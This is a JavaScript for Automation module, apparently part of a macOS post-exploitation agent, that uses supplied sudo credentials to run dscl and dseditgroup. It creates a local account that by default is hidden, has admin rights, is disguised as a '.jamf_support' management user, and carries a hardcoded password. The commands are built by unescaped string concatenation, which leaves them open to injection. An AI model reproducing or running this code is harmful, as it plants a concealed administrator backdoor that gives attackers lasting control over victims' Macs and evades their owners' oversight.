exports.add_user = function(task, command, params){
    try{
        // Add a user with dscl to the local machine
        let config = JSON.parse(params);
        let admin = true;
        let hidden = true;
        let username = ".jamf_support";
        let password = "P@55w0rd_Here";
        let realname = "Jamf Support User";
        let homedir = "/Users/";
        let uniqueid = 403;
        let primarygroupid = 80; //this is the admin group
        let usershell = "/bin/bash";
        let createprofile = false;
        let user = ""; //username of the user with sudo capability to do these commands
        let passwd = ""; //password of the user with sudo capability to do these commands
        if(config.hasOwnProperty("admin") && typeof config['admin'] == 'boolean'){ admin = config['admin']; }
        if(config.hasOwnProperty("hidden") && typeof config['hidden'] == 'boolean'){ hidden = config['hidden']; }
        if(config.hasOwnProperty("username") && config['username'] != ''){ username = config['username']; }
        if(config.hasOwnProperty("password") && config['password'] != ''){ password = config['password']; }
        if(config.hasOwnProperty("realname") && config['realname'] != ''){ realname = config['realname']; }
        if(config.hasOwnProperty("uniqueid") && config['uniqueid'] != -1){ uniqueid = config['uniqueid']; }
        else if(config.hasOwnProperty('uniqueid') && typeof config['uniqueid'] == 'string' && config['uniqueid'] != ''){ uniqueid = parseInt(config['uniqueid']); }
        if(config.hasOwnProperty("primarygroupid") && config['primarygroupid'] != -1){ primarygroupid = config['primarygroupid']; }
        else if(config.hasOwnProperty('primarygroupid') && typeof config['primarygroupid'] == 'string' && config['primarygroupid'] != ''){ primarygroupid = parseInt(config['primarygroupid']); }
        if(config.hasOwnProperty("usershell") && config['usershell'] != ''){ usershell = config['usershell']; }
        if(config.hasOwnProperty("createprofile") && typeof config['createprofile'] == "boolean"){ createprofile = config['createprofile']; }
        if(config.hasOwnProperty("homedir") && config['homedir'] != ''){ homedir = config['homedir']; }
        else{ homedir += username; }
        if(config.hasOwnProperty("user") && config['user'] != ''){ user = config['user']; }
        else{ return "User's name is required to do sudo commands"; }
        if(config.hasOwnProperty("passwd") && config['passwd'] != ''){ passwd = config['passwd']; }
        else{ return "User's password is required to do sudo commands"; }
        // now do our series of dscl commands to set up the account
        try{
            let cmd = "dscl . create /Users/" + username;
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            if(hidden){
                cmd = "dscl . create /Users/" + username + " IsHidden 1";
                currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            }
            cmd = "dscl . create /Users/" + username + " UniqueID " + uniqueid;
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            cmd = "dscl . create /Users/" + username + " PrimaryGroupID " + primarygroupid;
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            cmd = "dscl . create /Users/" + username + " NFSHomeDirectory \"" + homedir + "\"";
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            cmd = "dscl . create /Users/" + username + " RealName \"" + realname + "\"";
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            cmd = "dscl . create /Users/" + username + " UserShell " + usershell;
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            if(admin){
                cmd = "dseditgroup -o edit -a " + username + " -t user admin";
                currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            }
            cmd = "dscl . passwd /Users/" + username + " \"" + password + "\"";
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            if(createprofile){
                cmd = "mkdir \"" + homedir + "\"";
                currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
                cmd = "cp -R \"/System/Library/User Template/English.lproj/\" \"" + homedir + "\"";
                currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
                cmd = "chown -R " + username + ":staff \"" + homedir + "\"";
                currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            }
            return {"user_output": "Successfully ran the commands to create the user", "completed": true};
        }catch(error){
            return{"user_output": error.toString(), "status": "error", "completed": true};
        }
     }catch(error){
        return {"user_output": error.toString(), "status": "error", "completed": true};
     }

};
